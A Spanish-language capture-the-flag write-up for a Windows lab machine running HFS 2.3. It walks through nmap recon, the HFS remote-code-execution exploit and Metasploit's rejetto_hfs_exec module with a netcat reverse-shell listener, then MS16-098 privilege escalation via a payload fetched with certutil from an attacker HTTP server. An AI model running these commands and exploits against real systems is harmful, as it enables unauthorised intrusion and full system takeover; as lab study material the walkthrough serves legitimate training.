## Summary

Tags: #Windows #HFS #Metasploit #WindowsSuggester 

- IP -> 10.10.10.8
- Ports -> TCP (80), UDP (idk)
- OS ->  Windows 
- Services & Applications
    - 80 -> HttpFileServer httpd 2.3


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash
❯ ping -c 1 10.10.10.8                             # Para saber si la maquina esta activa o no (ttl=64 Linux, ttl=128 Windows)

	# IP = IP Address de la maquina target 
	# c = Numero de pings a ejecutar
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI

❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted

	#  p22,... = Indica los puertos que se quieren escanear
	#  sC = Lanza scripts básicos de enumeración
	#  sV = Enumera la versión y servicio que está corriendo en los puertos
	#  Target IP = Dirección IP que se quiere escanear
	#  oN targeted = Exporta el output a un fichero en formato nmap con nombre “targeted”
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

* Nos ponemos a investigar en la pagina Web

```bash
❯ searchsploit HFS 2.3                                # Para buscar un exploit y encontramos un Remote Command Execution en Python
❯ searchsploit -x multiple/remote/48569.py            # En este exploit debemos de hostear el Netcat para Windows, tambien nos dice que debemos de correr multiples veces para que sea efectivo
```

```bash
❯ searchsploit -m multiple/remote/48569.py              # Para descargarnos el exploit .py

	# m = move
```

## User

Buscamos el Netcat.exe 
```bash 
❯ locate netcat.exe                         # Buscamos el Netcat y lo copiamos a nuestro entorno de trabajo 
```

```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 en Linux
```

```bash
❯ rlwrap nc -nlvp 443                       # Nos ponemos en escucha para recibir la revershell
```

Antes de ejecutar el exploit, debemos de abrirlo con Nano y lo modificamos, cambiándole la IP a la que tenemos en nuestra VPN. 
```python 
❯ python2.7 48569.py 10.10.10.8 80                      # Lo ejecutamos, en donde la especificamos la IP victima y su puerto 
```

## HFS 2.3 Windows (Http File Server)

También podemos entrar al usuario por Metasploit 

```bash 
# Este exploit sirve para explotar un HttpFileServer
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/http/rejetto_hfs_exec        # Usamos el exploit 
	❯ options
	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
	❯ set LHOST 192.168.1.10                           # Colocamos nuestra IP (En caso de que estemos en una VPN)
	❯ exploit 
	❯ shell                                            # Creamos una sesion Shell para colocar los comandos mas facilmente
```

Ahora buscamos la flag de user.txt 

## Root

Debemos de buscar la manera de escalar privilegios y ser Administrador 

```bash
❯  whoami /priv                              # Miramos los privilegios que tenemos, pero no tenemos uno que valga la pena 
```

Podemos ir buscando en los directorios para ver si encontramos algo.

Si no encontramos nada, una manera de poder buscar vulnerabilidades es con el **' Windows Exploit Suggester'**
* [Windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
```bash
❯ systeminfo                                 # Nos copiamos todo lo que nos salga con ese comando, lo pegamos en un archivo llamado 'systeminfo.txt' y usaremos un programa llamado 'Windows Exploit Suggester' para detectar vulnerabilidades en un equipo Windows, todo desde nuestra maquina Linux con el archivo que hemos creado con ese informacion obtenida.
```

```python  
❯ python2.7 windows-exploit-suggester.py -h                 # Nos muestra el panel de ayuda 
❯ python2.7 windows-exploit-suggester.py -u                 # Descargamos el archivo que nos ayuda a filtrar por vulnerabilidades 
❯ python2.7 windows-exploit-suggester.py -d 2023-07-25-mssb.xls -i systeminfo.txt     # Ejecutamos el Windows Suggester y le pasamos el archivo que contiene la informacion de la maquina victima, asi como el archivo anteriormente descargado 
```

Nos muestra las vulnerabilidades obtenidas como:
* Integer Overflow y tiene una 'E' de Escalation 

```bash 
# Encontramos un CVE 'https://www.exploit-db.com/exploits/41020' y nos da (MS16-098) con un Identificador 'EDB-ID = 41020'

Ahora buscaremos en Google el binario en una pagina de Github
# ❯ https://gitlab.com/exploit-database/exploitdb-bin-sploits 

Despues nos vamos a la carpeta 'bin-sploits' y buscamos el identificador anterior y nos descargamos el exploit. 
```

Lo pasamos a la maquina victima de la siguiente manera: 
```bash 
# En la maquina de atacante Linux
3. ❯ python -m http.server              # Creamos un servidor y por default lo hace por el puerto 8000

# En la maquina victima Windows 
3. ❯ certutil.exe -f -urlcache -split http://IP:8000/payload.exe payload.exe         # Para descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
```

```bash 
❯ privesc.exe            # Ejecutamos el binario en la maquina de atacante
❯ whoami                 # Ahora somos NT Authority\System
```

Solo queda buscar la flag de root.txt 